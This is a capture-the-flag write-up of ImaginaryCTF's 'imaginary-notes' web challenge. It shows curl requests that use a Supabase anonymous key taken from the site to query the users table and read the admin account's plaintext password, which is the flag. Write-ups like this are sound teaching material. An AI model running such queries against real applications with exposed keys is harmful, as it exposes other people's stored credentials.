# imaginary-notes [WEB]

> I made a new note taking app using Supabase! Its so secure, I put my flag as the password to the `admin` account. I even put my anonymous key somewhere in the site. The password database is called `users`. \
> http://imaginary-notes.chal.imaginaryctf.org \
> By @cleverbear57

![login/signup page of the challenge](images/imaginaryctf_imaginary-notes.png)

## Messing around

I messed up by clicking the "Sign Up" button and leaving both inputs empty.

I saw it did the following request to know if my user already existed.

```bash
curl 'https://dpyxnwiuwzahkxuxrojp.supabase.co/rest/v1/users?select=id&username=eq.' \
  -H 'accept: application/json' \
  -H 'accept-profile: public' \
  -H 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI' \
  -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI' \
  -H 'x-client-info: supabase-js-web/2.50.3'
```

So I asked myself, what if I select all the users?

## Getting `admin` user

After a bit of tweaking, I got this URL.

```bash
curl 'https://dpyxnwiuwzahkxuxrojp.supabase.co/rest/v1/users?select=*&username=eq.admin' \
  -H 'accept: application/json' \
  -H 'accept-profile: public' \
  -H 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI' \
  -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI' \
  -H 'x-client-info: supabase-js-web/2.50.3'
```

Here, we're selecting a `username` that equals `admin` and we're also selecting all the columns with `*`.

```json
[
  {
    "id": "5df6d541-c05e-4630-a862-8c23ec2b5fa9",
    "username": "admin",
    "password": "ictf{why_d1d_1_g1v3_u_my_@p1_k3y???}"
  }
]
```

Here's our flag, was pretty simple.
